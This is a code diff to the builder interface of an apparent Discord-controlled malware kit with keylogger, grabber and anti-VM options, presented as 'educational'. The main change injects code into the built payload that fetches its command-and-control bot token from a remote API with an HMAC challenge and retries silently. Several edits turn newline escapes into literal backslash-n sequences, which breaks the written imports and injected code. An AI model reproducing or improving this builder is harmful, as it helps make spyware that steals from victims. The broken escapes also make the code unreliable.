@@ -76,9 +76,8 @@ def load_configuration(is_custom):
         config_path = 'configuration.ini'
 
     server_id.delete(0, END); server_id.insert(0, config['SETTINGS']['server_id'])
-    bot_token_1.delete(0, END); bot_token_1.insert(0, config['SETTINGS']['bot_token_1'])
-    bot_token_2.delete(0, END); bot_token_2.insert(0, config['SETTINGS']['bot_token_2'])
-    bot_token_3.delete(0, END); bot_token_3.insert(0, config['SETTINGS']['bot_token_3'])
+    token_api_url_entry.delete(0, END); token_api_url_entry.insert(0, config['SETTINGS']['token_api_url'])
+    api_secret_key_entry.delete(0, END); api_secret_key_entry.insert(0, config['SETTINGS']['api_secret_key'])
     registry_name.delete(0, END); registry_name.insert(0, config['SETTINGS']['registry_name'])
     directory_name.delete(0, END); directory_name.insert(0, config['SETTINGS']['directory_name'])
     executable_name.delete(0, END); executable_name.insert(0, config['SETTINGS']['executable_name'])
@@ -145,9 +144,8 @@ def recommended_configuration():
 
 def reset_configuration():
     server_id.delete(0, END)
-    bot_token_1.delete(0, END)
-    bot_token_2.delete(0, END)
-    bot_token_3.delete(0, END)
+    token_api_url_entry.delete(0, END)
+    api_secret_key_entry.delete(0, END)
     registry_name.delete(0, END)
     directory_name.delete(0, END)
     executable_name.delete(0, END)
@@ -191,11 +189,9 @@ def save_configuration():
     config = configparser.ConfigParser()
     config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}
 
-    config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}
     config['SETTINGS']['server_id'] = server_id.get()
-    config['SETTINGS']['bot_token_1'] = bot_token_1.get()
-    config['SETTINGS']['bot_token_2'] = bot_token_2.get()
-    config['SETTINGS']['bot_token_3'] = bot_token_3.get()
+    config['SETTINGS']['token_api_url'] = token_api_url_entry.get()
+    config['SETTINGS']['api_secret_key'] = api_secret_key_entry.get()
     config['SETTINGS']['registry_name'] = registry_name.get()
     config['SETTINGS']['directory_name'] = directory_name.get()
     config['SETTINGS']['executable_name'] = executable_name.get()
@@ -321,8 +317,60 @@ def assemble_source_code():
                     if len(source_code_modifiers[variable_name]) > 0:
                         source_assembled.write('    '*variable_intendation + ('    '*variable_intendation).join(source_code_modifiers[variable_name]))
                     else: source_assembled.write('\n')
+                    
                     if base_line == '# [pysilon_var] bottom 0\n' and config['FUNCTIONALITY']['keylogr'] == 'False':
-                        source_assembled.write('for token in bot_tokens:\n    decoded_token = base64.b64decode(token[::-1]).decode()\n    try:\n        client.run(decoded_token)\n    except: pass')
+                        token_url = config['SETTINGS']['token_api_url']
+                        secret_key = config['SETTINGS']['api_secret_key']
+
+                        injected_code = f'''
+import requests
+import time
+import json
+import hmac
+import hashlib
+
+def get_bot_token():
+    api_url = "{token_url}"
+    api_secret = "{secret_key}"
+    
+    while True:
+        try:
+            # Step 1: Get the challenge from the server
+            challenge_resp = requests.get(api_url + "?get_challenge=1")
+            if challenge_resp.status_code != 200:
+                time.sleep(60)
+                continue
+
+            data = challenge_resp.json()
+            challenge = data['challenge']
+            timestamp = data['timestamp']
+
+            # Step 2: Create the signature using the shared secret
+            message = f"{{challenge}}:{{timestamp}}".encode('utf-8')
+            signature = hmac.new(api_secret.encode('utf-8'), message, hashlib.sha256).hexdigest()
+
+            # Step 3: Request the token with the solved challenge
+            token_url = f"{{api_url}}?challenge={{challenge}}&timestamp={{timestamp}}&signature={{signature}}"
+            token_resp = requests.get(token_url)
+
+            if token_resp.status_code == 200:
+                token = token_resp.json().get('token')
+                if token and len(token) > 50:
+                    return token # Success!
+
+        except:
+            pass # Silently retry on any error
+            
+        time.sleep(300) # Wait 5 minutes before retrying the whole process
+
+try:
+    client.run(get_bot_token())
+except:
+    pass
+'''
+                        indented_code = '\\n'.join(['    ' * variable_intendation + line for line in injected_code.strip().split('\\n')])
+                        source_assembled.write(indented_code + '\\n')
+
                 elif '# [pysilon_mark] !debug' in base_line and not debug_mode: pass
                 elif '# [pysilon_mark] !anti-vm' in base_line and debug_mode: pass
                 elif '# [pysilon_mark] !grabber' in base_line and not config['FUNCTIONALITY']['grabber'] == 'True': pass
@@ -357,14 +405,14 @@ def compile_source():
     custom_imports = configparser.ConfigParser()
     custom_imports.read('resources/custom_imports.ini')
     with open('custom_imports.txt', 'w') as imports_file:
-        imports_file.write('pynacl\n')
+        imports_file.write('pynacl\\n')
         for functionality in config['FUNCTIONALITY'].keys():
             if config['FUNCTIONALITY'][functionality] == 'True':
                 for custom_import in custom_imports[functionality].keys():
                     if custom_import != 'nothing_special':
-                        imports_file.write(custom_imports[functionality][custom_import] + '\n')
+                        imports_file.write(custom_imports[functionality][custom_import] + '\\n')
         for general_packages in custom_imports['general'].keys():
-            imports_file.write(custom_imports['general'][general_packages] + '\n')
+            imports_file.write(custom_imports['general'][general_packages] + '\\n')
 
     response = compiler.compile(debug_mode)
     compile_btn['state'] = DISABLED
@@ -419,56 +467,55 @@ else:
     cbvar_custom_icon = BooleanVar(value=True)
     Label(settings_canvas, text='General settings:', justify=RIGHT, anchor=E).grid(row=2, padx=(30, 5), pady=(30, 2), sticky=E)
     Label(settings_canvas, text='Server ID*:', justify=RIGHT, anchor=E).grid(row=3, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='Bot Token*:', justify=RIGHT, anchor=E).grid(row=4, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='Emergency Token 1:', justify=RIGHT, anchor=E).grid(row=5, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='Emergency Token 2:', justify=RIGHT, anchor=E).grid(row=6, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='Registry Name*:', justify=RIGHT, anchor=E).grid(row=7, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='Folder Name*:', justify=RIGHT, anchor=E).grid(row=8, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='Executable name*:', justify=RIGHT, anchor=E).grid(row=9, padx=(30, 5), pady=2, sticky=E)
-    Checkbutton(settings_canvas, selectcolor='#0A0A10', text='Custom Icon*:', variable=cbvar_custom_icon, command=config_modification, justify=RIGHT, anchor=E, onvalue=True, offvalue=False).grid(row=10, padx=(30, 5), pady=2, sticky=E)
+    Label(settings_canvas, text='Token API URL*:', justify=RIGHT, anchor=E).grid(row=4, padx=(30, 5), pady=2, sticky=E)
+    Label(settings_canvas, text='API Secret Key*:', justify=RIGHT, anchor=E).grid(row=5, padx=(30, 5), pady=2, sticky=E)
+    Label(settings_canvas, text='Registry Name*:', justify=RIGHT, anchor=E).grid(row=6, padx=(30, 5), pady=2, sticky=E)
+    Label(settings_canvas, text='Folder Name*:', justify=RIGHT, anchor=E).grid(row=7, padx=(30, 5), pady=2, sticky=E)
+    Label(settings_canvas, text='Executable name*:', justify=RIGHT, anchor=E).grid(row=8, padx=(30, 5), pady=2, sticky=E)
+    Checkbutton(settings_canvas, selectcolor='#0A0A10', text='Custom Icon*:', variable=cbvar_custom_icon, command=config_modification, justify=RIGHT, anchor=E, onvalue=True, offvalue=False).grid(row=9, padx=(30, 5), pady=2, sticky=E)
     
     icon_photo = PhotoImage(file='icon.png')
     icon_btn = Button(settings_canvas, image=icon_photo, state=NORMAL, width=120, height=120, command=change_icon)
-    icon_btn.grid(row=10, column=1, pady=2, sticky=NW, rowspan=6)
+    icon_btn.grid(row=9, column=1, pady=2, sticky=NW, rowspan=6)
 
     debug_mode_btn = Button(settings_canvas, text='Debug mode [OFF]', fg='gray', state=NORMAL, width=12, height=1, command=debug_toggle)
     debug_mode_btn.grid(row=15, column=1, padx=(5, 5), pady=10, sticky=NSEW, rowspan=2)
+    
     tooltip_label = Label(frame, text="Note: Debug mode should only be used for development or testing!", relief=RIDGE, borderwidth=2, background="#0A0A10")
     debug_mode_btn.bind("<Enter>", show_tooltip)
     debug_mode_btn.bind("<Leave>", hide_tooltip)
 
     var_server_id = StringVar()
-    var_bot_token_1 = StringVar()
-    var_bot_token_2 = StringVar()
-    var_bot_token_3 = StringVar()
+    var_token_api_url = StringVar()
+    var_api_secret_key = StringVar()
     var_registry_name = StringVar()
     var_directory_name = StringVar()
     var_executable_name = StringVar()
+    
     server_id = Entry(settings_canvas, textvariable=var_server_id)
-    bot_token_1 = Entry(settings_canvas, textvariable=var_bot_token_1)
-    bot_token_2 = Entry(settings_canvas, textvariable=var_bot_token_2)
-    bot_token_3 = Entry(settings_canvas, textvariable=var_bot_token_3)
+    token_api_url_entry = Entry(settings_canvas, textvariable=var_token_api_url, width=40)
+    api_secret_key_entry = Entry(settings_canvas, textvariable=var_api_secret_key, width=40)
     registry_name = Entry(settings_canvas, textvariable=var_registry_name)
     directory_name = Entry(settings_canvas, textvariable=var_directory_name)
     executable_name = Entry(settings_canvas, textvariable=var_executable_name)
     
 
     var_server_id.trace_add("write", config_modification)
-    var_bot_token_1.trace_add("write", config_modification)
-    var_bot_token_2.trace_add("write", config_modification)
-    var_bot_token_3.trace_add("write", config_modification)
+    var_token_api_url.trace_add("write", config_modification)
+    var_api_secret_key.trace_add("write", config_modification)
     var_registry_name.trace_add("write", config_modification)
     var_directory_name.trace_add("write", config_modification)
     var_executable_name.trace_add("write", config_modification)
-    server_id.grid(row=3, column=1)
-    bot_token_1.grid(row=4, column=1)
-    bot_token_2.grid(row=5, column=1)
-    bot_token_3.grid(row=6, column=1)
-    registry_name.grid(row=7, column=1)
-    directory_name.grid(row=8, column=1)
-    executable_name.grid(row=9, column=1)
-    settings_canvas.pack(anchor=NW, fill=X)
 
+    server_id.grid(row=3, column=1)
+    token_api_url_entry.grid(row=4, column=1)
+    api_secret_key_entry.grid(row=5, column=1)
+    registry_name.grid(row=6, column=1)
+    directory_name.grid(row=7, column=1)
+    executable_name.grid(row=8, column=1)
+    
+    settings_canvas.pack(anchor=NW, fill=X)
+    
     Label(settings_canvas, text='Malware functionality:', justify=LEFT, anchor=W).grid(row=2, column=2, padx=(30, 0), pady=(30, 0), sticky=W)
 
     cbvar_keylogger = BooleanVar(value=True)
@@ -564,7 +611,7 @@ else:
 
     bottom_buttons = Canvas(frame, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
-    cb_disclaimer = Checkbutton(bottom_buttons, selectcolor='#0A0A10', text='  I\'m aware that this malware has been made for educational purposes only, and the creator is no way responsible\n  for any direct or indirect damage caused due to the misusage of the information. Everything I do, I\'m doing at\n  my own risk and responsibility.', variable=cbvar_disclaimer, command=disclaimer_toggle, onvalue=True, offvalue=False, justify=LEFT, anchor=W)
+    cb_disclaimer = Checkbutton(bottom_buttons, selectcolor='#0A0A10', text='  I\\'m aware that this malware has been made for educational purposes only, and the creator is no way responsible\\n  for any direct or indirect damage caused due to the misusage of the information. Everything I do, I\\'m doing at\\n  my own risk and responsibility.', variable=cbvar_disclaimer, command=disclaimer_toggle, onvalue=True, offvalue=False, justify=LEFT, anchor=W)
     cb_disclaimer.grid(row=1)
     bottom_buttons.pack(pady=(20, 0))
 
